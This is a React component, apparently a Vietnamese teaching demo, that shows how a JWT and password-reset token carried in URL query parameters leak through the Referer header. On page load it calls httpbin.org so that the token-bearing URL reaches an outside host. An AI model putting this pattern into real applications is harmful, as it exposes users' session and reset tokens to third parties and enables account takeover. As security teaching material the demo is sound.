import React, { useEffect } from "react";
import { useLocation } from "react-router-dom";

const ForgotPasswordDemo = () => {
  const location = useLocation();
  const params = new URLSearchParams(location.search);

  const email = params.get("email");
  const jwt = params.get("jwt");
  const resetToken = params.get("resetToken");   

  useEffect(() => {
    // gửi request để leak referer
    fetch("https://httpbin.org/anything");
  }, []);

  return (
    <div style={{ padding: 20 }}>
      <h1>🔥 Demo Leak JWT qua Referer</h1>

      <p><b>Email:</b> {email}</p>

      {/* JWT */}
      <p><b>JWT nhận được từ BE (jwt):</b></p>
      <code
        style={{
          display: "block",
          background: "#eee",
          padding: "10px",
          wordBreak: "break-all",
          borderRadius: "6px",
          marginBottom: "20px"
        }}
      >
        {jwt ? jwt : "❌ Không tìm thấy jwt trong URL"}
      </code>

      {/* Reset Token */}
      <p><b>Reset Token (resetToken):</b></p>
      <code
        style={{
          display: "block",
          background: "#eee",
          padding: "10px",
          wordBreak: "break-all",
          borderRadius: "6px"
        }}
      >
        {resetToken ? resetToken : "123456"}
      </code>

      <p style={{ marginTop: 20 }}>
        Mở DevTools → Network → click request tới httpbin.org → tab Headers  
        → bạn sẽ thấy <b>jwt</b> hoặc <b>resetToken</b> xuất hiện trong REFERER.
      </p>
    </div>
  );
};

export default ForgotPasswordDemo;
